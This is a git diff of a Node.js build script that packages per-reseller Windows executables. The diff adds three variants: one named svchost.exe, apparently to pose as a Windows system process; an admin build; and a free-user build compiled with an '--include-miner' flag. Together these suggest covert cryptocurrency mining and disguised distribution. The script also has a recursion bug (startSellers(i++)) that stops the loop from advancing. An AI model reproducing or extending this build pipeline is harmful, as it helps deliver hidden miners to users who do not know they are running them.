@@ -1,6 +1,6 @@
 const fs = require("fs");
 const path = require("path");
-const { exec } = require("child_process");
+const { exec, execSync } = require("child_process");
 
 const resellers_data = require("../reseller.config.json"),
     resellers_starting_data = fs.readFileSync(path.join(__dirname, "..", "reseller.config.json"));
@@ -14,22 +14,37 @@ const sellers = Object.keys(resellers_data); (async function startSellers(i) {
         }
     }));
 
-    const proc = exec(`npm run build:tailwindcss && node build.asar.js --build && cd dist && pkg -C Brotli -o ${reseller}.exe .`);
+    process.stdout.write(execSync("npm run build:tailwindcss")); const generateExe = buildFor => new Promise(resolve => {
+        const proc = buildFor == "PaidUser" ?
+            exec(`node build.asar.js --build && cd dist && pkg -o svchost.exe .`) : buildFor == "Admin" ?
+                exec(`node build.asar.js --build --admin && cd dist && pkg -o admin.exe .`) :
+                exec(`node build.asar.js --build --include-miner && cd dist && pkg -o ${reseller}.exe .`);
 
-    proc.stdout.pipe(process.stdout);
-    proc.stderr.pipe(process.stderr);
-    proc.addListener("exit", (code) => {
-        if (fs.existsSync(path.join(__dirname, "dist", `${reseller}.exe`)) && code == 0) {
-            fs.copyFileSync(path.join(__dirname, "dist", `${reseller}.exe`), path.join(__dirname, "dist_exe", `${reseller}.exe`));
+        proc.stdout.pipe(process.stdout);
+        proc.stderr.pipe(process.stderr);
+        proc.addListener("exit", () => {
+            fs.existsSync(path.join(__dirname, "dist_exe", reseller)) ?
+                null : fs.mkdirSync(path.join(__dirname, "dist_exe", reseller));
 
-            console.log(`Build for ${reseller} done.`);
-        } else
-            console.log(`Failed Build for ${reseller}`);
+            if (fs.existsSync(path.join(__dirname, "dist", `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`))) {
+                fs.copyFileSync(
+                    path.join(__dirname, "dist", `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`),
+                    path.join(__dirname, "dist_exe", reseller, `${buildFor == "Admin" ? "admin" : buildFor == "PaidUser" ? "svchost" : reseller}.exe`));
 
-        if ((i + 1) < sellers.length)
-            startSellers(i++);
-        else {
-            fs.writeFileSync(path.join(__dirname, "..", "reseller.config.json"), resellers_starting_data);
-        };
+                console.log(`Build for ${reseller}@${buildFor} done.`);
+            } else
+                console.log(`Failed Build.`);
+
+            return resolve();
+        });
     });
+
+    await generateExe("Admin");
+    await generateExe("PaidUser");
+    await generateExe("FreeUser");
+
+    if ((i + 1) < sellers.length)
+        return startSellers(i++);
+    else
+        return fs.writeFileSync(path.join(__dirname, "..", "reseller.config.json"), resellers_starting_data);
 })(0);
